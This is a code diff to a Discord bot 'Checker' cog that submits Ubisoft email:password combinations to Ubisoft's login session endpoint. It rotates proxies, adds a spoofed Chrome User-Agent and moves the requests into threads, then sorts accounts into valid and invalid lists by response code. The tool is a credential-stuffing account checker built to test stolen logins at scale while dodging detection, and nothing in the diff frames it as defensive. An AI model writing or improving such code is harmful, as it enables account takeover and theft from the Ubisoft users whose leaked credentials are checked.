@@ -8,7 +8,7 @@ import asyncio
 import random
 import io
 import os
-from curl_cffi import requests
+import requests # Standard requests, NOT curl_cffi
 import json
 
 UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"
@@ -62,7 +62,8 @@ class Checker(commands.Cog):
             "Authorization": f"Basic {b64_auth}",
             "Accept": "application/json",
             "Origin": "https://account.ubisoft.com",
-            "Referer": "https://account.ubisoft.com/"
+            "Referer": "https://account.ubisoft.com/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         }
 
         embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
@@ -71,14 +72,17 @@ class Checker(commands.Cog):
         proxies_dict = {"http": proxy, "https": proxy} if proxy else None
 
         try:
-            response = requests.post(
-                "https://public-ubiservices.ubi.com/v3/profiles/sessions",
-                headers=headers,
-                json={"rememberMe": True},
-                impersonate="chrome",
-                proxies=proxies_dict,
-                timeout=15
-            )
+            # Run synchronous requests in a separate thread to not block discord
+            def do_request():
+                return requests.post(
+                    "https://public-ubiservices.ubi.com/v3/profiles/sessions",
+                    headers=headers,
+                    json={"rememberMe": True},
+                    proxies=proxies_dict,
+                    timeout=15
+                )
+
+            response = await asyncio.to_thread(do_request)
             
             if response.status_code == 200:
                 embed.color = 0x57F287
@@ -199,22 +203,24 @@ class Checker(commands.Cog):
                     "Authorization": f"Basic {b64_auth}",
                     "Accept": "application/json",
                     "Origin": "https://account.ubisoft.com",
-                    "Referer": "https://account.ubisoft.com/"
+                    "Referer": "https://account.ubisoft.com/",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                 }
 
                 proxy = random.choice(self.proxies) if self.proxies else None
                 proxies_dict = {"http": proxy, "https": proxy} if proxy else None
                 
-                try:
-                    response = requests.post(
+                def do_req():
+                    return requests.post(
                         "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                         headers=headers,
                         json={"rememberMe": True},
-                        impersonate="chrome",
                         proxies=proxies_dict,
                         timeout=15
                     )
-                    
+
+                try:
+                    response = await asyncio.to_thread(do_req)
                     if response.status_code == 200:
                         valid_accounts.append(acc)
                     elif response.status_code == 401:
